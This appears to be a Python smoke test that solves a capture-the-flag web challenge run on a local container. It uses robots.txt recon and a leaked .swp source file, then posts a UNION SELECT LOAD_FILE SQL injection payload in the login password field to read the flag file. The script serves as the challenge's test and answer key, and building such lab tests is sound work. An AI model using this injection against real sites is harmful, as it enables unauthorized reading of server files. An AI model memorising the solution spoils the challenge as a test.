#!/usr/bin/env python3
"""
web-neon-auth end-to-end smoke test.
Chain: robots.txt -> leaked /.index.php.swp discloses source -> SQL injection in the
login form with FILE priv + secure_file_priv="" -> UNION ... LOAD_FILE('/tmp/office.txt').
Exit 0 = PASS.
"""
import os
import re
import sys
import time

import requests

TARGET = os.environ.get("TARGET", "http://127.0.0.1:10007").rstrip("/")
FLAG_RE = re.compile(r"CTF4\{[^}]+\}")
# The login query selects two columns (id, username), and its username/password sit on
# SEPARATE lines. Injecting via `password` (the last value before LIMIT 1) lets a
# single-line `-- -` comment close the query cleanly; the flag lands in the username column.
PAYLOAD = {
    "username": "x",
    "password": "' UNION SELECT 1, LOAD_FILE('/tmp/office.txt')-- -",
}


def expected_flag():
    path = os.environ.get("FLAGS_ENV", "")
    if path and os.path.exists(path):
        for line in open(path):
            m = re.match(r"\s*FLAG=(.*)", line)
            if m:
                return m.group(1).strip()
    return None


def wait_up():
    # MariaDB warms up inside the container; give it time.
    for _ in range(45):
        try:
            r = requests.get(f"{TARGET}/", timeout=5)
            if r.status_code < 500 and "Database connection failed" not in r.text:
                return
        except requests.RequestException:
            pass
        time.sleep(2)


def solve():
    # 1. recon: robots.txt points at the flag file; the .swp leaks the source
    robots = requests.get(f"{TARGET}/robots.txt", timeout=10).text
    assert "/tmp/office.txt" in robots, "robots.txt breadcrumb missing"
    swp = requests.get(f"{TARGET}/.index.php.swp", timeout=10)
    assert swp.status_code == 200 and b"b0VIM" in swp.content, "leaked .swp not served"

    # 2. SQLi -> LOAD_FILE reads the flag file into the rendered username
    r = requests.post(f"{TARGET}/", data=PAYLOAD, timeout=10)
    m = FLAG_RE.search(r.text)
    return m.group(0) if m else ""


def main():
    wait_up()
    got = solve()
    want = expected_flag()
    print(f"[captured] {got!r}")
    if got and (want is None or got == want):
        print("PASS")
        return 0
    print(f"FAIL expected={want!r}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
